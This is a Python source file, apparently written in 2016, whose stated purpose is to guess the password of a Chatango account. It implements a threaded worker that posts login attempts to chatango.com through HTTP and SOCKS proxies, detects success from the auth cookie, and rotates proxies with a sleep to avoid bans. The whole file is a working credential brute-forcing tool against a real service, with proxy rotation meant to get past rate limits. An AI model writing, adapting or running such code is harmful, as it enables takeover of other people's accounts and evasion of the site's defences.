#!/usr/bin/python
# Created May 17, 2016
# Purpose: Used to guess a chatango password

import requests
import threading
import Queue
import sys
import time


"""
valid in_q commands:
    ('guess', password)         <- Guess the password
valid out_q commands:
    ('cracked', password)       <- The password is cracked
    ('badproxy', password)      <- The proxy is bad.  Stop giving us passwords to guess.
    ('proxyerror', password)    <- We failed to guess the password, readd to another queue
    ('guessed', password)       <- We guessed the password, it was wrong. 
"""

GUESSED = 0
CRACKED = 1
PROXYERROR = 2
BADPROXY = 3
PROXY_HTTP = 0
PROXY_SOCKS4 = 1
PROXY_SOCKS5 = 2
# sleep for 1s to avoid proxies getting temp-banned from chatango
SLEEP_TIME = 1

class ProxyPasswordGuesser(threading.Thread):
    # proxy must be an HTML proxy
    # username is the username of the account
    def __init__(self, proxyip, proxyport, proxytype, username, VERBOSE, MAX_FAIL=1):
        if proxytype == PROXY_HTTP:
            s = 'http'
        elif proxytype == PROXY_SOCKS4:
            s = 'socks4'
        elif proxytype == PROXY_SOCKS5:
            s = 'socks5'
        else:
            raise Exception('BAD PROXY TYPE %s' % proxytype)
        self.proxy = {'http': '%s://%s:%s' % (s, proxyip, proxyport)}
        self.VERBOSE = VERBOSE
        self.proxyip = proxyip
        self.proxyport = proxyport
        self.username = username
        # number of times we have failed, stop trying if the proxy fails MAX_FAIL times
        self.failures = 0
        self.MAX_FAIL = MAX_FAIL
        # communication queues
        self.in_q = Queue.Queue()
        self.out_q = Queue.Queue()
        self.stoprequest = threading.Event()
        super(ProxyPasswordGuesser, self).__init__()

    # guess the password
    def guess(self, password):
        if self.failures >= self.MAX_FAIL:
            return BADPROXY
        data = {
            'user_id': self.username,
            'password': password,
            'storecookie': 'on',
            'checkerrors': 'yes',
            }
        auth = None
        try:
            if self.VERBOSE:
                sys.stdout.write('doing http request in %s:%s' % (self.proxyip, self.proxyport) + '\n')
            r = requests.post('http://chatango.com/login', data=data, proxies=self.proxy)
            auth = r.cookies.get('auth.chatango.com')
            if self.VERBOSE:
                sys.stdout.write('finished http request in %s:%s' % (self.proxyip, self.proxyport) + '\n')
        except Exception, e:
            if self.VERBOSE:
                sys.stdout.write('exception: ' + str(e) + '\n')
            self.failures += 1
            return PROXYERROR
        if auth:
            return CRACKED
        else:
            if "Incorrect log" in r.text or "Incorrect pass" in r.text:                
                return GUESSED            
            else:        
                return PROXYERROR

    # take passwords to guess from in_queue
    # output in out_queue
    def run(self):
        while not self.stoprequest.isSet():
            try:
                # timeout in 1 second
                #if self.VERBOSE:
                    #sys.stdout.write('%s:%s getting from queue' % (self.proxyip, self.proxyport) + '\n')
                result = self.in_q.get(True, 1)
                cmd = result[0]
                data = result[1]
                if cmd == 'guess':
                    if self.VERBOSE:
                        sys.stdout.write('%s:%s received guess command' % (self.proxyip, self.proxyport) + '\n')
                    result = self.guess(data)
                    if result == BADPROXY:
                        if self.VERBOSE:
                            sys.stdout.write('%s:%s badproxy' % (self.proxyip, self.proxyport) + '\n')
                        self.out_q.put(('badproxy', data))
                    elif result == CRACKED:
                        if self.VERBOSE:
                            sys.stdout.write('%s:%s cracked' % (self.proxyip, self.proxyport) + '\n')
                        self.out_q.put(('cracked', data))
                    elif result == PROXYERROR:
                        if self.VERBOSE:
                            sys.stdout.write('%s:%s proxyerror' % (self.proxyip, self.proxyport) + '\n')
                        self.out_q.put(('proxyerror', data))
                    elif result == GUESSED:
                        if self.VERBOSE:
                            sys.stdout.write('%s:%s guessed' % (self.proxyip, self.proxyport) + '\n')
                        time.sleep(SLEEP_TIME)
                        self.out_q.put(('guessed', data))
                else:
                    sys.stdout.write('[Error] Command: "%s" is not supported' % cmd + '\n')
            except Queue.Empty:
                #if self.VERBOSE:
                    #sys.stdout.write('queue empty %s:%s' % (self.proxyip, self.proxyport) + '\n')
                continue

    # stop the thread
    def join(self, timeout=None):        
        self.stoprequest.set()        
        super(ProxyPasswordGuesser, self).join(timeout)

        
        
            

    
